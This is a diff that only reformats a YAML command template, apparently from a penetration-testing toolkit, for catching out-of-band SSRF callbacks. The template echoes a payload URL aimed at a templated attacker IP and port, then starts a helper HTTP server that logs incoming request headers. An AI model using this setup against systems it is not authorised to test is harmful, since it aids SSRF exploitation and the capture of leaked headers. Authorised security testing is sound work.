@@ -1,17 +1,12 @@
+---
 metadata:
-  filename: capture-http-ssrf-out-of-band-responses-including-headers.yaml
-  tags:
-  - web
-  created: '2025-04-10'
-  author: Unknown
-content: 'mkdir -p packstation/outbound; \
+  filename: "capture-http-ssrf-out-of-band-responses-including-headers.yaml"
+  tags: ["web"]
+  created: "2025-04-10"
+  author: "Unknown"
 
-  echo ''Possible payload to enter: http://{{ attacker_ip }}:{{ delivery_outbound_port
-  }}/non-existent-path''; \
-
-  echo ''================================================================''; \
-
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port
-  }} -d packstation/outbound --show-headers
-
-  '
+content: |
+  mkdir -p packstation/outbound; \
+  echo 'Possible payload to enter: http://{{ attacker_ip }}:{{ delivery_outbound_port }}/non-existent-path'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound --show-headers
